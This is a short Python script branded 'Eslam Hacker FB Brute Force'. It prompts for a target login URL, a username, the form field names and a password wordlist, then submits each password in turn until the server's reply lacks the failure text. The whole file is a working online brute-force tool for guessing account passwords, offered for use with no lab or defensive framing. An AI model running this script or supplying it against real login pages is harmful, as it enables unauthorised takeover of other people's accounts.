import requests
from time import sleep
from colorama import Fore, init

init()

def print_banner():
    print(Fore.RED + r"""
     👁️‍🗨️ Welcome 👁️‍🗨️
   ███████╗███████╗██╗     █████╗ ███╗   ███╗
   ██╔════╝██╔════╝██║    ██╔══██╗████╗ ████║
   ███████╗█████╗  ██║    ███████║██╔████╔██║
   ╚════██║██╔══╝  ██║    ██╔══██║██║╚██╔╝██║
   ███████║███████╗███████╗██║  ██║██║ ╚═╝ ██║
   ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
       [ Eslam Hacker FB 🔥 Brute Force ]
    """ + Fore.RESET)

def brute_force_login(url, username, user_field, pass_field, fail_text, wordlist_path):
    try:
        with open(wordlist_path, 'r') as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(Fore.YELLOW + "[!] Wordlist not found!" + Fore.RESET)
        return

    for password in passwords:
        password = password.strip()
        data = {user_field: username, pass_field: password}
        print(Fore.CYAN + f"[+] Trying: {password}" + Fore.RESET)
        response = requests.post(url, data=data)

        if fail_text not in response.text:
            print(Fore.GREEN + f"[✔] Password found: {password}" + Fore.RESET)
            return
        sleep(0.5)

    print(Fore.RED + "[-] Password not found in wordlist." + Fore.RESET)

# ------ Main ------
print_banner()
target_url = input("[?] Login URL: ")
username = input("[?] Username: ")
user_field = input("[?] User Field Name (e.g. user): ")
pass_field = input("[?] Pass Field Name (e.g. pass): ")
fail_text = input("[?] Fail Text in Response (e.g. Login failed): ")
wordlist_path = input("[?] Wordlist Path (e.g. wordlist.txt): ")

brute_force_login(target_url, username, user_field, pass_field, fail_text, wordlist_path)
python3 brute.py
